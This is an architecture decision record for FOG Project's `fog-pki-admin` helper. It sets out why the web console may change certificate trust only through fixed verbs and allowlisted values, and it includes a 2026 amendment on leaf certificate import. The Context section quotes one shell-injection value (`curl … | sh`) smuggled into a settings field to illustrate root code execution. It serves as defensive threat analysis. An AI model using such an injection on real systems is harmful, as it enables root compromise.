# The web tier changes PKI through a fixed verb set, never through a path

## Status

accepted, and implemented on `working-1.6` as `packages/pki/fog-pki-admin` plus
`_installPkiAdminHelper()`.

## Amended 2026-09-02 — the leaf is not the CA

Settles FOGProject/fogproject#1685, and reverses one of the alternatives
rejected below. GH-1681 changed the ground: `/etc/fog/customizations/pki` is now
a documented place to put a certificate you brought, and a `web-leaf.pem` /
`web-leaf.key` pair dropped there is signal 0 of
`_detectExternalCertManagement()`. The page already *reports* the derived
`externally_managed_leaf` state; nothing could act on it.

**What this ADR never decided.** The decision below is about a root CA, and it
says so throughout — `import-root`, the anchor, "what this server trusts". A
leaf appears once, in the Consequences, only to say `acmeLeaf` is retired and
the state is derived. Leaf *import* was not considered and not rejected. Read as
a blanket rule, "PHP is the threat model" forecloses it; that reading is wider
than what was argued for, and this amendment narrows the rule to what the
argument actually supports.

**The narrowing.** No **CA** private key transits PHP. A vhost leaf key may. The
two are not the same asset:

| material | blast radius if the web tier is compromised |
|---|---|
| root CA key | the certificate every `fog-client` **pins** — impersonate the imaging server to the whole estate, push arbitrary images and snapins as SYSTEM |
| vhost leaf key | TLS for the console, on a box whose web tier the attacker already owns |

The qualifier that keeps this honest is **wildcards**. A `*.example.com` key is
the common case an administrator already holds, and it covers hosts that are not
this one — so its theft is the one outcome that escalates past "the attacker
already owns this web tier". That is a reason to say so at the point of upload
and to prefer the two routes that never send a key, not a reason to refuse the
channel: every enrollment protocol that avoids it is CSR-based (PKCS#10, ACME,
EST, CMP), PKCS#12 exists precisely to transport a key with its certificate, and
the appliances that do accept one — pfSense, UniFi, iDRAC, Proxmox, IIS, cPanel
— are all cases where the management UI is already the privileged process.

**What does not change.** The web tier still names a verb and an allowlisted
token, and still never names a path. `import-leaf` is a sixth verb, not a
reversal of the rule: the helper decides every destination, exactly as
`import-root` does. In particular the PKCS#12 **passphrase is not an argument**.
`_pkiRun()` builds a command line and `exec()`s it, so an argument is readable
in `/proc` by every local user for the life of the call; the passphrase is
staged as a second file under the same `reqid`, read with `openssl -passin
file:`, and unlinked with it.

**Three routes, because they suit different policies.** In the order the page
offers them:

| route | verbs | does a key transit PHP? |
|---|---|---|
| adopt what is in `PKI_custom_dir` | `adopt-custom-leaf` | no |
| CSR out, certificate in | `make-leaf-csr`, `install-leaf-cert <reqid>` | no — the helper generates the key at `0400 root:root` |
| upload a leaf bundle | `import-leaf <reqid>` | yes, for one request |

`adopt-custom-leaf` takes **no argument at all**: the directory comes from the
helper's own `0600 root:root` config. A free-text "use the certificate at this
path" field was the obvious alternative and is refused on the grounds already
recorded below — the sibling directory GH-1681 blessed is what makes a
fixed-location action possible instead. `make-leaf-csr` follows
`packages/web/service/nodecert.php`, which has signed storage-node CSRs without
moving a key since before this page existed.

**Accept the artifacts administrators actually hold.** A fullchain PEM — leaf,
intermediates, sometimes the root — or a bare leaf with a separate
`web-leaf-chain.pem`, or a PKCS#12 container. All are split by the helper and
classified by property, never by position: the certificate whose public key
matches the private key is the leaf, and the remaining non-self-signed ones are
the chain. Position cannot be trusted, and `_writeWebChainFiles()` and
`_rootFromChain()` already say why — FOG's own writers disagree, with
`createWebIntermediateCA()` writing issuer-first and `validateExternalCA()`
writing the root first.

**The leaf slot receives exactly one certificate.** A fullchain input is split
before anything is written, never stored whole. GH-863 is what this rule is made
of: once `PKI_web_vhost_cert` named the assembled bundle, every run appended one
more copy of the intermediate — fourteen certificates on a live server — and
iPXE validates pairwise from the trusted root upwards, so copy 2 was checked
against copy 1 as its issuer and every HTTPS netboot died at `boot.php` with
nothing server-side saying why. Browsers tolerated it. This is the highest-risk
regression in the feature, and it is pinned by test.

**New checked properties**, the analogue of `import-root` keeping only
self-signed certificates:

- The leaf must **not** be a CA. Refusing `CA:TRUE` is what makes "no CA private
  key reaches this channel" a checked property rather than a promise.
- The certificate and key must be a genuine pair, by `_certKeyPairMatches()`'s
  subject-public-key comparison — not an RSA modulus, which cannot read an EC
  key at all (GH-1393).
- The leaf must be in date, and a path must **build**: `openssl verify -trusted
  <anchor set> -untrusted <supplied chain>`. Adopting a leaf whose chain does
  not build trades a working server for a broken one, because FOG's own HTTPS
  self-calls stop verifying — which is what `tests/selfcall-verification.test.sh`
  exists to catch. The refusal names the issuer that is missing.
  `docs/PKI_ZONES.md` documents the one escape hatch, for split-horizon and
  pinned deployments; it is not a checkbox on the page.

**A root inside an uploaded bundle is reported, never anchored.** The page says
which issuer the leaf chains to and that this server does not trust it yet, and
offers a separate import that runs the existing `import-root` path. Anchoring
changes what the whole host accepts, so it stays a decision somebody makes
knowingly — the reasoning that already keeps `import-root` self-signed-only.

This obliges the new verbs to **strip self-signed certificates out of whatever
they write to `PKI_web_trust_chain`**, and the reason is not tidiness.
`_resolveTrustAnchor()` anchors `_rootFromChain("${PKI_web_trust_chain}")`, so a
root left in the chain file is anchored on the next rebuild and the explicit
import becomes theatre. Note the asymmetry, before anyone simplifies the strip
away: the *served* chain is already safe, because `_writeWebChainFiles()` filters
self-signed out when it assembles — "a self-signed certificate in here is the
root, and it is the one thing that must not be sent". It is the anchor path that
needs the strip.

**Certificate material takes effect at once; flags still wait for the
installer.** This narrows the Consequence below that says the preferences "take
effect on the next installer run and not before". That reasoning is right for a
flag the installer reads back and wrong for a certificate: a button labeled
"use this certificate" that does not change what the server serves is a button
that does not work. So the certificate verbs relink `PKI_web_vhost_cert` and
`PKI_web_vhost_key` and reload the web server. The vhost needs no rewrite — it
already names the canonical paths — so relink plus reload is the whole of it.
The preferences are unchanged.

**`set-preference`'s allowlist becomes per-key, and this reverses a rejected
alternative.** The value pattern was one `^(yes|no)$` for all three keys.
`BOOT_url_proto` is `http` or `https`, so the domain becomes per-key —
`^(http|https)$` for that one. Still a value drawn from a fixed set, so the rule
holds; it is the implementation that generalizes.

The reversal is the substantive part, and is stated plainly rather than left to
be discovered. "`BOOT_url_proto_forced` in the allowlist" is rejected below,
because "forcing netboot to HTTPS with neither steering key set … breaks PXE for
machines that cannot fix themselves. Not a thing a misclick should reach."
Adding `BOOT_url_proto` achieves what that entry would have, and this ADR should
not pretend otherwise: `_resolveInstallMode()` sets `BOOT_url_proto_forced=yes`
whenever an explicit value is supplied, so writing the protocol **is** forcing
it.

What answers the original objection is the two conditions it named, both now
met. The switch is never offered alone — `BOOT_url_proto`,
`BOOT_rebuild_ipxe_with_my_ca` and `PKI_web_cert_publicly_trusted` are presented
as **one decision**, because "can iPXE validate what this server serves" is one
question and three keys are how it is answered. And it is not a misclick: the
page states that a leaf iPXE cannot verify means every netboot dies at
`boot.php`; that under `BOOT_url_proto=https` ADR 0018 makes `FOG_WEB_HOST` a
record rather than a control, rewritten on every run; and that the install
**stops** if the served certificate carries no usable name, since
`--extra-server-name` feeds only FOG's own SAN list and cannot rescue a leaf
issued outside FOG. The gate is still `system.pki`, deny by default.

**The redirect and netboot transport are two settings, and the page must stop
implying otherwise.** `WEB_https_redirect` already excludes netboot, and does it
conditionally: when `BOOT_url_proto != https` the vhost skips the redirect for
`service/ipxe/`, `service/secureboot/` and `service/uboot/` — the three paths a
bootloader fetches for itself, the last being U-Boot's HTTP-only `wget`, which
cannot follow a redirect at all. `management/other/ca.cert.der` is exempt
**unconditionally**, whatever the netboot transport, because redirecting it would
make fetching the CA require already trusting the CA. Everything else FOS
fetches uses `curl -Lks` and so survives a redirect, which is load-bearing and
recorded nowhere else: a FOS fetch that ever drops `-k` has to be added to the
exclusion too.

Two obligations follow. The behavior is **pinned by test against the generated
config for both engines**, because `docs/PKI_ZONES.md` lists the nginx branch of
this exclusion among the things that have never executed. And the page states
that the redirect is **not fully reversible**: it also emits
`Strict-Transport-Security max-age=15768000`, which is the redirect's semantics
with a memory — a browser that has seen it refuses plain HTTP to this host for
six months out of its own cache, so turning the switch off does nothing for
anyone who has already visited.

**A signing request may carry the administrator's own subject.** The names and
the distinguished name that go into `make-leaf-csr`'s request are supplied by the
web tier, and that is a value not drawn from a fixed set -- the rule this ADR
leads with. It is admitted because of what the artifact is, not because the rule
bends: a request is a **request**, vetted by the administrator's own CA; FOG's
Web CA `nameConstraints` do not apply, since FOG is not the signer; and the key
is generated at `0400 root:root` and never leaves, so a compromised web tier that
talked a lax CA into signing a name it does not own still cannot use the result.

The bound is not an allowlist of values but a discipline about bytes. Every field
is validated and **re-emitted** into a config the helper builds: a `/` or an `=`
or a line break in a distinguished-name value is refused rather than escaped,
because the value is written both into an openssl `-subj` string, where `/`
starts another field, and into a config file, where a newline starts another
section. `fog-sign-node-cert` already applies exactly this to a node's proposed
names -- "the bytes openssl reads are ones this script constructed".

Two things follow that are worth stating so they are not tidied away.
`PKI_allowed_domain_names` deliberately does **not** bound the requested names:
it constrains what FOG's own CA may sign, and narrowing it here would refuse the
case the route exists for. And a request that drops the name this server answers
to is **reported, not refused** -- netboot and FOG's own self-calls address this
server by a name the served certificate carries (ADR 0018), but a load-balancer
name is a legitimate reason to know better, and refusing would make this the one
route that cannot express what a CA requires. The zero-argument call still asks
for FOG's derived names under FOG's own organization, so the default is unchanged.

**The helper still duplicates rather than shares.** `_certKeyPairMatches()`,
`_customPkiPair()`, `_splitPemBundle()`, `_rootFromChain()` and `_linkCanonical()`
are ported into `fog-pki-admin`, not called. An installed server has `bin/` but
no `lib/`, so there is nothing to share — the same reason the helper already
carries its own copy of `_splitPemBundle()` and the anchor rebuild, and the same
obligation: the tests pin both copies against one behavior.
`_detectExternalCertManagement()` is **not** ported. Signal 0 is as portable as
`_customPkiPair()`, but signals 1 through 3 need `$etcconf` — the live,
OS-specific vhost path — along with `$fogprogramdir` and `$PKI_client_cert_dir`,
and a helper that reconstructed those would be answering a question it cannot
see the inputs to.

## Context

`FOGConfigurationPage::certificates()` was read-only. Everything an
administrator might want to *change* — trust a corporate root, say the web
certificate is publicly issued, turn the HTTPS redirect on — was done by
re-running the installer with flags or by hand-editing `.fogsettings`.

Making it writable runs straight into the reason the page exists at all. Its
headline card asks whether this web application can read a CA private key, and
the answer is supposed to be no, because **PHP is the threat model**. The keys
live at `0400 root:root` in `0700` directories precisely so a compromise of the
web tier cannot reach them. So "let the page change the PKI" is, stated
honestly, "let the thing we assume may be compromised change what this server
trusts".

Two of the four things GH-1121 asked for cannot be done by the web user at all:

- `.fogsettings` is `0600 root:root`, and `docs/FOGSETTINGS.md` states the rule
  flatly — the only non-root reader is `Route::whoami()`, reading the published
  `.fogsettings.pub` subset.
- `pki/root/ca`, `pki/web/ca`, `pki/web/leaf` and `pki/secureboot` are `0700
  root:root`, so the web tier cannot read even the **public** Web CA
  certificate, let alone hand it out.

And one of them is worse than it looks. `.fogsettings` is **sourced as shell by
root** on the next installer run. A helper that let the web tier write an
arbitrary `key=value` into it is not a permissions nicety with a sharp edge; it
is a root shell with extra steps. `WEB_https_redirect="no'; curl … | sh; #"`
executes as root at install time, and nothing in between would report it.

FOG already answers this shape twice — `fog-sign-kernel` and
`fog-sign-node-cert`. Both are root-owned helpers the web user reaches through
a narrow `sudoers` rule, and both take **no path arguments**, because that is
what stops a compromised web server naming its own key.

## Decision

A third helper of the same shape, `fog-pki-admin`, and the generalization of
the rule those two encode:

**The web tier names a VERB and an allowlisted token. It never names a path, a
key, or a value that is not drawn from a fixed set.**

Five verbs, and nothing else:

| verb | what the caller may say | what the helper decides |
|---|---|---|
| `status` | nothing | which certificates and key paths exist; emits public metadata only |
| `export <slot> <reqid>` | one of eight slot names, a 32-hex id | which file each slot resolves to |
| `import-root <reqid>` | a 32-hex id | whether the upload is a self-signed, in-date CA; where it lands |
| `clear-root` | nothing | — |
| `set-preference <key> <value>` | one of **three** keys, `yes` or `no` | — |

Three consequences are the whole point:

- **The `^(yes|no)$` pattern is the security boundary, not a validation
  nicety.** It is what makes writing into a root-sourced shell file safe, so it
  lives on the far side of `sudo` where a compromised web tier cannot remove
  it. A duplicate check in PHP would be harmless; the helper's is load-bearing.
- **`set-preference` refuses a key the file does not already carry.** It never
  appends, so it cannot move a managed key past `## End of FOG Settings` into
  the region `writeUpdateFile()`'s merge treats as the administrator's own
  lines.
- **`import-root` keeps only self-signed certificates.** Anchoring an
  intermediate would trust it *as a root*, widening what the host accepts.
  `_resolveTrustAnchor()` filters the same way, so the two halves cannot
  disagree.

**The readability check stays in PHP.** The helper reports the private keys'
*paths*; the page tests `is_readable()` itself. The helper runs as root, so
"root can read it" answers a different question from the one the card asks.

**The gate is `system.pki`, deny by default.** No schema step seeds it, so only
a holder of `*` has it until an administrator grants it — the way
`system.export` and `impersonate.start` arrived. `settings.edit` was the
alternative and is wrong for the same reason it was wrong for the database
dump: six page nodes already map onto it, and "may edit the OUI table" is not
"may decide what this server trusts".

**Rotating FOG's own root is not offered.** The page composes the
`installfog.sh` invocation and states the cost. It changes the certificate
every registered fog-client pins, so every client stops authenticating until it
is re-pinned; that is a migration with a re-pin story, and a web form should
not be able to start one in a click.

## Consequences

- A third `sudoers` drop-in on a master. All three are `visudo -cqf`-validated
  before installation and removed when their precondition stops holding —
  here, a server that is a storage node, which does not serve the management UI
  at all.
- `_resolveTrustAnchor()` now reads `PKI_web_external_root_cert` directly.
  Before, an imported root reached the anchor only through the chain file,
  which `validateExternalCA()` writes — and that runs only when all three of
  `--ca-cert`/`--ca-key`/`--ca-root` were supplied. "Just trust our corporate
  root" is the narrower ask, and without this the next installer run rebuilt
  the anchor without it and silently undid the import.
- The imported root is copied to a canonical path inside the web zone, and
  *that* path is what `.fogsettings` records. `--ca-root` persists the
  administrator's **source** path, which is routinely a temp file that is gone
  by the next run.
- The three preferences take effect on the next installer run and not before.
  The page says so at the point of change, because that is the difference
  between a flag — read back before it runs — and a checkbox.
- The helper duplicates `_splitPemBundle()` and the anchor rebuild from
  `lib/common/functions.sh`. An installed server has `bin/` but no `lib/`, so
  there is nothing to share; `tests/pki-admin-helper.test.sh` and
  `tests/trust-anchor.test.sh` pin both copies against the same behavior.
- `acmeLeaf` is not settable, because GH-1120 retired it. Whether a leaf is
  managed elsewhere is derived from whether `PKI_web_vhost_cert` resolves
  outside the web zone, and the page reports that derived state rather than
  offering a flag that could disagree with the filesystem.

## Alternatives rejected

**A `sudoers` rule on `sed`, or on a generic settings writer.** Reduces to
arbitrary root code execution through `.fogsettings`, as above.

**Passing paths to the helper and validating them there.** The moment the
caller names a file, the helper's job becomes proving a path is safe — symlinks,
`..`, TOCTOU, bind mounts — instead of never being handed one. The two existing
helpers already made this choice and it is the reason they are short enough to
audit.

**Publishing the Web CA and vhost certificates into `management/other/` so the
web tier could read them directly.** Would have avoided a `sudo` call for the
downloads, at the cost of a second copy of every certificate to keep in step
and a new set of files in the document root. `status` and `export` cover it
with no new published state.

**Letting the page write `.fogsettings` through a `.fogsettings.pub`-style
writable subset.** The public file exists so secrets can stay unreadable; a
*writable* counterpart would have to be merged back by root anyway, which is
this helper with a queue in front of it and a window in which the two disagree.

**`BOOT_url_proto_forced` in the allowlist.** Forcing netboot to HTTPS with
neither steering key set is GH-1116's "legal but warned" case: it breaks PXE for
machines that cannot fix themselves. Not a thing a misclick should reach.

## References

- Issue: FOGProject/fogproject#1121, under FOGProject/fogproject#1116
- [ADR 0024](0024-fogsettings-unified-key-model.md) — the key model, and why
  `acmeLeaf` is derived rather than stored
- [ADR 0015](0015-install-settings-are-independent-keys.md) — the three
  preferences are independent keys
- Issue: FOGProject/fogproject#1685 — the 2026-09-02 amendment; FOGProject/fogproject#1681 blessed the directory it adopts from
- [ADR 0040](0040-certificates-you-bring-live-in-a-customizations-tree.md) — the customizations tree the leaf is adopted out of
- [ADR 0018](0018-netboot-addresses-this-server-by-its-certificate-name.md) — why `BOOT_url_proto=https` makes `FOG_WEB_HOST` a record
- `docs/PKI_ZONES.md` — the zones the slots name
- `docs/FOGSETTINGS.md` — the reader table this helper is now the second entry in
